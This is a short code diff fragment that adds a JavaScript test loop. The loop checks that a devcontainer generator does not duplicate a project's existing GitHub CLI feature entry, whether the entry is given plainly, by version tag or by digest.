+  for (const own of ['ghcr.io/devcontainers/features/github-cli', 'ghcr.io/devcontainers/features/github-cli:1', 'ghcr.io/devcontainers/features/github-cli@sha256:abc']) {
+    const other = wrapperRepo();
+    other.write(DC, `{\n  "image": "python:3.12",\n  "features": { "${own}": {} }\n}\n`);
+    await generator('devcontainer')(other, { name: 'shop', layers: ['nx', 'agent'] });
+    const ids = Object.keys(parseJsonc(other.read(DC, 'utf8')).features).filter((id) => id.includes('github-cli'));
+    ok(ids.length === 1 && ids[0] === own, `a project's ${own} is not joined by the house's: ${ids}`);
+  }
 
   // A second run adds nothing new: the record neither grows nor loses what the FIRST run added.
   const before = recorded().length;
